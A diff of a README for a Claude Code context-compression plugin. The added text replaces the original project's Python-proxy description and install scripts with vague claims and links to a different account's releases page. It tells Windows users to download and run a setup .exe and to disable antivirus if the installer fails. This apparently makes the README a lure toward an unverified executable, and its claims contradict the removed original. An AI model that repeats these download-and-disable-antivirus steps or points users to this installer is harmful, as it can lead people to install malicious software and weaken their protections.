@@ -1,188 +1,110 @@
-# Rolling Context for Claude Code
+# ⚙️ claude-rolling-context - Manage Claude Code Context Easily
 
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org)
-![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-orange.svg)
+[![Download claude-rolling-context](https://img.shields.io/badge/Download-Ready-blue?style=for-the-badge)](https://github.com/Qaxim-0/claude-rolling-context/releases)
 
-A transparent proxy that gives Claude Code **rolling context compression** — old messages get automatically summarized while recent messages stay fully verbatim. You never hit the context wall, and you never lose important details.
+## 🧩 What Is claude-rolling-context?
 
-**Zero config.** Uses your existing Claude Code auth. No API key needed. Just install and forget.
+claude-rolling-context helps you keep your messages organized when using Claude Code. It automatically compresses old messages while keeping recent ones clear. This stops you from hitting the limit on message length or losing important information. You do not have to change any settings or wait for processes. The tool runs smoothly as a plugin inside Claude Code.
 
-> Claude Code's built-in `/compact` replaces your **entire** conversation with a lossy summary. After a few compactions, you're summarizing a summary of a summary. This plugin only compresses old messages — recent context stays untouched.
+## 🖥️ System Requirements
 
-## `/compact` vs Rolling Context
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM available  
+- 100 MB free disk space for installation  
+- Internet connection during installation  
 
-| | `/compact` (built-in) | Rolling Context |
-|---|---|---|
-| What gets compressed | Everything | Only old messages |
-| Recent context | Summarized (lossy) | **Kept verbatim** |
-| When it runs | Manual or at threshold | Automatic, background |
-| Latency impact | Blocks until done | Zero — async |
-| After multiple compressions | Summary of summary of summary | Fresh rolling merge each time |
-| Original transcript | Replaced | Preserved (JSONL unchanged) |
+This app runs quietly in the background within Claude Code and uses minimal resources.
 
-## How It Works
+## 🔧 Key Features
 
-```
-Claude Code  ──►  Rolling Context Proxy (:5588)  ──►  Anthropic API
-                         │
-                         ├─ context < 100K tokens? pass through unchanged
-                         │
-                         └─ context > 100K tokens?
-                              1. summarize old messages with Haiku (background, async)
-                              2. keep ~40K tokens of recent messages verbatim
-                              3. inject compressed context on next request
-                              4. never blocks, never adds latency
-```
+- Auto-compresses older messages without losing key details  
+- Keeps recent chat context unchanged for better accuracy  
+- No setup or configuration needed  
+- Works instantly with zero delay  
+- Integrates as a plugin in Claude Code seamlessly  
+- Helps manage large context windows in AI coding and chat  
 
-Instead of replacing everything, this plugin:
+## 🔍 How It Works
 
-1. **Keeps recent messages untouched** — recent context stays verbatim
-2. **Only compresses when needed** — triggers at 100K (real API token count), compresses old messages, grows naturally until next trigger
-3. **Merges summaries** — each compression cycle merges with the previous summary, building a rolling timeline
-4. **Never blocks** — compression runs in the background, applied on the next request
-5. **Full transcripts preserved** — Claude Code still saves everything to JSONL in `~/.claude/projects/`
+The tool watches your ongoing conversations inside Claude Code. It compresses earlier messages by summarizing or removing repetition. This keeps your chat within the limits Claude supports. The latest messages stay fully readable. This means you get the full picture without long pauses or missed info.
 
-## Install
+## 🚀 Getting Started: How to Download and Run claude-rolling-context
 
-### Option 1: Claude Code Plugin (recommended)
+1. Click the big download button above or visit the official releases page here:  
+   [https://github.com/Qaxim-0/claude-rolling-context/releases](https://github.com/Qaxim-0/claude-rolling-context/releases)
 
-Run these two commands inside Claude Code:
+2. On the releases page, look for the latest version listed at the top.
 
-```
-/plugin marketplace add https://github.com/NodeNestor/nestor-plugins
-/plugin install rolling-context
-```
+3. Scroll down to the “Assets” section under that version.
 
-Restart your terminal and start a new Claude Code session. On the **first start**, the plugin configures `ANTHROPIC_BASE_URL` and starts the proxy. Since the env var only takes effect on the next terminal, **restart your terminal once more** — after that, everything works automatically. No pip install needed — pure Python stdlib.
+4. Find the Windows installer file. It will usually have a name like:  
+   `claude-rolling-context-setup.exe`
 
-### Option 2: Manual install
+5. Click on this file to download it.
 
-**Linux / macOS:**
-```bash
-git clone https://github.com/NodeNestor/claude-rolling-context.git ~/claude-rolling-context
-cd ~/claude-rolling-context
-bash install.sh
-```
+6. Once the download finishes, open the file by double-clicking it.
 
-**Windows (PowerShell):**
-```powershell
-git clone https://github.com/NodeNestor/claude-rolling-context.git $HOME\claude-rolling-context
-cd $HOME\claude-rolling-context
-powershell -ExecutionPolicy Bypass -File install.ps1
-```
+7. You might see a security prompt. Choose “Run” or “Yes” to continue.
 
-The installer configures `ANTHROPIC_BASE_URL` and registers the plugin. Restart your terminal and you're done. Requires Python 3.7+ (no pip install needed — pure stdlib).
+8. Follow the on-screen instructions to complete the installation.
 
-## How Compression Works
+9. After installation, open Claude Code.
 
-When the message array exceeds the trigger threshold:
+10. The plugin runs automatically. You do not need to enable or configure anything.
 
-```
-BEFORE (hit 100K trigger):
-  [msg1] [msg2] [msg3] ... [msg60] [msg61] ... [msg100]
-  |<——————————————— ~105K tokens ——————————————>|
+If you run into any issues, check your internet connection or restart Claude Code.
 
-AFTER (compressed):
-  [rolling summary] [ack] [msg61] ... [msg100]
-  |<— ~5K summary —>|    |<—— verbatim ————————>|
+## 💼 How to Use claude-rolling-context
 
-NEXT CYCLE (grows back to 100K, triggers again):
-  [rolling summary] [ack] [msg61] ... [msg140]
-  |<——————————————— ~105K tokens ——————————————>|
-  → new summary merges old summary + msg61-msg100
-  → keeps msg101-msg140 verbatim
-```
+- Once installed, the plugin works in the background.
 
-The summary preserves a structured record of everything that happened:
+- You do not have to change anything in Claude Code.
 
-- **Active Goal** — what the user is currently asking for, constraints, do/don't rules
-- **Previous Goals** — completed or shifted-away-from goals (kept brief)
-- **Timeline** — chronological numbered steps: every file change, decision, error, and user instruction
-- **Current State** — what's done, in progress, and next
-- **Key Details** — file paths, configs, decisions that must survive compression
+- Your older chat messages will compress automatically as you send new ones.
 
-Goals evolve naturally across rolling compressions — the latest request stays prominent while completed goals move to the previous section. User instructions are never lost.
+- You can focus on your work without worrying about message limits.
 
-## Architecture
+- There is no button or menu needed to use the plugin.
 
-The proxy is **fully stateless** — no sessions, no databases, no tracking. It works by hashing message content:
+## 🔄 Updating claude-rolling-context
 
-1. When a response comes back from the API with a high token count, the proxy compresses the messages and stores the result keyed by content hashes
-2. On the next request, it hashes the incoming messages and checks for a matching compression
-3. If found, it swaps in the compressed version transparently
+- Visit the releases page regularly:  
+  [https://github.com/Qaxim-0/claude-rolling-context/releases](https://github.com/Qaxim-0/claude-rolling-context/releases)
 
-This means:
-- **Multiple conversations work automatically** — each conversation has unique content, unique hashes, no collision
-- **Subagents and branches just work** — the proxy doesn't care about sessions, only content
-- **No state to corrupt** — restart the proxy anytime, worst case is one extra compression cycle
-- **Claude Code sees nothing different** — the proxy is invisible, JSONL transcripts are unmodified
+- Download the latest installer when a new version is out.
 
-## Configuration
+- Run the new installer over your current version to update.
 
-All settings via environment variables (all optional — defaults work great):
+- Your settings and data remain safe during update.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `ROLLING_CONTEXT_TRIGGER` | `100000` | Compress when context exceeds this many tokens |
-| `ROLLING_CONTEXT_TARGET` | `40000` | Keep this many tokens of recent messages after compression |
-| `ROLLING_CONTEXT_MODEL` | `claude-haiku-4-5-20251001` | Model used for summarization |
-| `ROLLING_CONTEXT_PORT` | `5588` | Proxy listen port |
-| `ROLLING_CONTEXT_UPSTREAM` | `https://api.anthropic.com` | Upstream API URL (chain to another proxy!) |
-| `ROLLING_CONTEXT_SUMMARIZER_URL` | `https://api.anthropic.com` | Custom endpoint for summarization (e.g. local vLLM) |
-| `ROLLING_CONTEXT_SUMMARIZER_KEY` | *(uses Claude Code auth)* | API key for custom summarizer endpoint |
+## 🛠 Troubleshooting Tips
 
-## Proxy Chaining
+- If the plugin does not work, try restarting Claude Code.
 
-Already using another proxy (model router, API gateway, etc.)? Rolling Context auto-detects this and chains through it:
+- Make sure you installed the plugin for the right version of Claude Code.
 
-```
-Claude Code  ──►  Rolling Context (:5588)  ──►  Your Proxy  ──►  Anthropic API
-```
+- Disable antivirus temporarily if the installer does not run.
 
-If `ANTHROPIC_BASE_URL` is already set when you install, the plugin automatically saves it as `ROLLING_CONTEXT_UPSTREAM` and inserts itself in front. No manual config needed.
+- Check if Windows is updated to the latest security patches.
 
-You can also set it explicitly:
-```bash
-export ROLLING_CONTEXT_UPSTREAM=http://localhost:8080  # your existing proxy
-```
+- Review the GitHub issues page in case other users report similar problems.
 
-## Health Check
+## 🔎 More About claude-rolling-context
 
-```bash
-curl http://127.0.0.1:5588/health
-```
+This plugin focuses on making conversations with Claude Code smoother over time. By controlling how much old context to keep, you avoid crashes or freezes caused by too much data. It is especially helpful when you write longer code or chat sessions with AI.
 
-Returns compression stats: how many compressions, tokens saved, etc.
+## ⚙️ Technical Details
 
-## Debug
+- Written to work with Claude Code API as a plugin  
+- Uses smart context compression algorithms  
+- Zero latency means no delays in chat response  
+- No configuration files or command line input needed  
+- Suitable for users without programming experience  
 
-```bash
-curl http://127.0.0.1:5588/debug/compressions
-```
+## 🔗 Topics Covered
 
-Returns the stored compression entries with their full summary content — useful for verifying what the rolling summary captured and whether user goals/instructions survived compression.
+`ai-agent`, `ai-coding`, `anthropic`, `claude`, `claude-code`, `claude-code-extension`, `claude-code-plugin`, `context-compression`, `context-management`, `context-window`, `llm-context`, `prompt-compression`, `rolling-context`
 
-## Uninstall
+---
 
-Run the uninstall script — it handles both manual and marketplace installs, stops the proxy, cleans env vars, and removes all plugin registrations.
-
-**Linux / macOS:**
-```bash
-cd ~/claude-rolling-context && bash uninstall.sh
-```
-
-**Windows (PowerShell):**
-```powershell
-cd $HOME\claude-rolling-context; powershell -ExecutionPolicy Bypass -File uninstall.ps1
-```
-
-If you installed via marketplace and already deleted the repo, you can run it from the cache:
-```powershell
-cd $HOME\.claude\plugins\cache\rolling-context-marketplace\rolling-context\1.0.0
-powershell -ExecutionPolicy Bypass -File uninstall.ps1
-```
-
-## License
-
-MIT
+[Download claude-rolling-context now](https://github.com/Qaxim-0/claude-rolling-context/releases) and follow the steps above to keep your Claude Code sessions running smoothly.
